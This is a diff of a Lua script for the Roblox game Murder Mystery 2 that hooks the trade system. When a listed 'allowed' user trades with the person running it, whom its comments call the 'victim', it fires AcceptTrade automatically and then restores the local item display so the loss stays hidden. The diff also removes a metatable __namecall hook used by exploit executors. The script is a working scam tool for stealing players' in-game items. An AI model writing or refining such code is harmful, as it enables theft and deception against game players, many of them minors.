@@ -144,8 +144,8 @@ end
 local function hook_mm2()
     local Trade = RS:WaitForChild("Trade", 10)
     if not Trade then return end
-    local updateTrade  = Trade:WaitForChild("UpdateTrade", 10)
-    local acceptTrade  = Trade:WaitForChild("AcceptTrade", 10)
+    local updateTrade = Trade:WaitForChild("UpdateTrade", 10)
+    local acceptTrade = Trade:WaitForChild("AcceptTrade", 10)
     if not updateTrade or not acceptTrade then return end
 
     local items = collect_mm2_items()
@@ -155,8 +155,7 @@ local function hook_mm2()
     local currentLastOffer = nil
     local tradingWithAllowed = false
     local storedItems = {}
-
-    local ok, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
+    local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
 
     local function isAllowedUser(name)
         for _, n in ipairs(CFG.allowed) do
@@ -167,7 +166,7 @@ local function hook_mm2()
 
     local function storeItems()
         storedItems = {}
-        if ok and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+        if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
             for k, v in pairs(ProfileData.Weapons.Owned) do
                 storedItems[k] = v
             end
@@ -175,64 +174,57 @@ local function hook_mm2()
     end
 
     local function restoreItems()
-        if ok and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+        if okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
             for k, v in pairs(storedItems) do
                 ProfileData.Weapons.Owned[k] = v
             end
         end
     end
 
-    updateTrade.OnClientEvent:Connect(function(tradeData)
-        if type(tradeData) ~= "table" then return end
+    -- capture all args to find tradeId
+    updateTrade.OnClientEvent:Connect(function(...)
+        local args = {...}
+        local tradeData = nil
+        for _, v in ipairs(args) do
+            if type(v) == "number" then
+                currentTradeId = v
+            elseif type(v) == "table" then
+                tradeData = v
+            end
+        end
+        if not tradeData then return end
+
+        currentLastOffer = tradeData.LastOffer
 
         local p1 = tradeData.Player1
         local p2 = tradeData.Player2
         if not p1 or not p2 then return end
 
-        local otherPlayer = nil
+        local myData, otherData
         if p1.Player == lp then
-            otherPlayer = p2.Player
+            myData, otherData = p1, p2
         elseif p2.Player == lp then
-            otherPlayer = p1.Player
-        end
+            myData, otherData = p2, p1
+        else return end
 
-        if not otherPlayer then return end
-
-        local otherName = typeof(otherPlayer) == "Instance" and otherPlayer.Name or tostring(otherPlayer)
+        local otherName = typeof(otherData.Player) == "Instance" and otherData.Player.Name or tostring(otherData.Player)
         tradingWithAllowed = isAllowedUser(otherName)
 
         if tradingWithAllowed then
             storeItems()
-            -- auto accept when victim presses ready (Accepted becomes true)
-            local victimData = p1.Player == lp and p1 or p2
-            if victimData.Accepted and currentTradeId then
+            -- auto accept when victim (myData) becomes accepted
+            if myData.Accepted and currentTradeId and currentLastOffer then
                 task.spawn(function()
-                    task.wait(0.5)
+                    task.wait(0.3)
                     pcall(function()
                         acceptTrade:FireServer(currentTradeId, currentLastOffer)
                     end)
+                    task.wait(1)
+                    restoreItems()
                 end)
             end
         end
     end)
-
-    -- hook AcceptTrade to capture tradeId/lastOffer and auto-fire
-    local mt = getrawmetatable(game)
-    local oldIndex = mt.__index
-    setreadonly(mt, false)
-    mt.__namecall = newcclosure(function(self, ...)
-        local method = getnamecallmethod()
-        if method == "FireServer" and self == acceptTrade then
-            local args = {...}
-            currentTradeId = args[1]
-            currentLastOffer = args[2]
-            if tradingWithAllowed then
-                task.delay(1, restoreItems)
-            end
-        end
-        return oldIndex(self, ...)
-    end)
-    setreadonly(mt, true)
 
     local gui = lp:WaitForChild("PlayerGui")
     local tradeGui      = gui:WaitForChild("TradeGUI", 10)
